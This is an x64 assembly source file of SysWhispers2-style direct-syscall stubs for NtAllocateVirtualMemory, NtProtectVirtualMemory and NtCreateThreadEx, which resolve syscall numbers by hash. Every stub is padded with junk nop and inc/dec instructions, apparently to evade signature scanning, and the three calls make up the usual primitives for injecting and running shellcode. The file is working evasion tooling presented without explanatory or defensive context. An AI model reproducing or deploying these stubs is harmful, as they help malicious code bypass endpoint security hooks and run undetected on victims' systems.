.code

EXTERN SW2_GetSyscallNumber: PROC

NtAllocateVirtualMemory PROC
	mov [rsp +8], rcx          ; Save registers.
	mov [rsp+16], rdx
	nop
	inc rdx
	nop
	dec rdx
	mov [rsp+24], r8
	nop
	mov [rsp+32], r9
	sub rsp, 38h
	add rsp, 10h
	mov ecx, 0C98B39E3h        ; Load function hash into ECX.
	nop
	nop
	call SW2_GetSyscallNumber  ; Resolve function hash into syscall number.
	add rsp, 38h
	nop
	nop
	sub rsp, 10h
	mov rcx, [rsp +8]          ; Restore registers.
	nop
	inc rax
	nop
	dec rax
	mov rdx, [rsp+16]
	mov r8, [rsp+24]
	nop
	inc rbx
	nop
	dec rbx
	mov r9, [rsp+32]
	mov r10, rcx
	inc rax
	dec rax
	syscall                    ; Invoke system call.
	ret
NtAllocateVirtualMemory ENDP

NtProtectVirtualMemory PROC
	mov [rsp +8], rcx          ; Save registers.
	inc rax
	mov [rsp+16], rdx
	nop
	inc rax
	inc rax
	mov [rsp+24], r8
	nop
	dec rax
	nop
	dec rax
	mov [rsp+32], r9	
	sub rsp, 38h
	nop
	inc bx
	nop
	inc cx
	inc cx 
	nop
	add rsp, 10h
	dec cx
	dec cx
	mov ecx, 04DD15B4Fh        ; Load function hash into ECX.
	inc rax
	dec bx
	dec rax
	call SW2_GetSyscallNumber  ; Resolve function hash into syscall number.
	add rsp, 38h
	sub rsp, 10h
	nop
	mov rcx, [rsp +8]          ; Restore registers.
	mov rdx, [rsp+16]
	nop
	mov r8, [rsp+24]
	mov r9, [rsp+32]
	mov r10, rcx
	inc rbx
	dec rbx
	syscall                    ; Invoke system call.
	ret
NtProtectVirtualMemory ENDP

NtCreateThreadEx PROC
	mov [rsp +8], rcx          ; Save registers.
	push rcx
	pop rcx
	mov [rsp+16], rdx
	mov [rsp+24], r8
	nop
	inc ecx
	nop
	inc edx
	nop
	nop
	dec cx
	dec edx
	mov [rsp+32], r9
	sub rsp, 38h
	add rsp, 10h
	mov ecx, 0AC8FEA72h        ; Load function hash into ECX.
	nop
	inc ecx
	nop
	inc edx
	nop
	nop
	dec cx
	dec edx
	call SW2_GetSyscallNumber  ; Resolve function hash into syscall number.
	add rsp, 38h
	add rax, 10h
	inc edx
	nop
	nop
	dec cx
	sub rsp, 10h
	mov rcx, [rsp +8]          ; Restore registers.
	sub eax, 8h
	inc ax
	sub rax, 9h
	mov rdx, [rsp+16]
	mov r8, [rsp+24]
	inc rax
	dec rax
	mov r9, [rsp+32]
	mov r10, rcx
	inc rcx
	dec rcx
	nop
	syscall                    ; Invoke system call.
	ret
NtCreateThreadEx ENDP

end